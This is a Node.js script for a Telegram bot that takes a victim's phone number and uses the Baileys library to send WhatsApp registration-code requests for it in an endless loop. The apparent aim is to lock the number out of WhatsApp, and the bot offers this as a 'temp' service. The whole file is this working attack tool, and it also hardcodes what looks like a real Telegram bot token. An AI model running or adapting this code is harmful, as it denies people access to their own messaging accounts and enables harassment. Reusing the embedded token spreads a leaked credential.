const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { promisify } = require('util');
const readdir = promisify(fs.readdir);
const readFile = promisify(fs.readFile);
const TelegramBot = require('node-telegram-bot-api');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/number.json'));

const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('.mm');
  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' }),
  });

  console.clear();

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 666,
        });
        b = res.reason === 'temporarily_unavailable';
        if (b) {
          console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
          setTimeout(async () => {
            dropNumber(context);
          }, res.retry_after * 10);
          return;
        }
      } catch (error) {
        console.log(error);
      }
    }
  };
  
    const botToken = '6991020336:AAGgdqhWYVk53KZc89DnSSxGKpZAARKwmvs';
  const bot = new TelegramBot(botToken, { polling: true });

const path = require('path');

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const videoPath = path.join(__dirname, 'files', 'tajammal.mp4');
  const caption = 'Welcome! 5 minute Bot use: /temp  92/ number';

  bot.sendVideo(chatId, videoPath, { caption, parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});

bot.onText(/\/temp (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!match[1]) {
    bot.sendMessage(chatId, 'provide a number in the format /temp DDI / number.');
    return;
  }

  const input = match[1].split('/');
  const ddi = input[0];
  const number = input[1];

  if (!ddi || !number) {
    bot.sendMessage(chatId, 'provide a number in the format /temp DDI / number.');
    return;
  }

  const phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number };
  fs.writeFileSync('./files/number.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number });

  const caption = `\`\`\`5minutos: +${phoneNumber}\`\`\``;
  const imagePath = path.join(__dirname, 'files', 'tajammal.png');

  bot.sendPhoto(chatId, imagePath, { caption, parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});


  console.log(gradient('red', 'red')('bsy log console.'));
};

start();
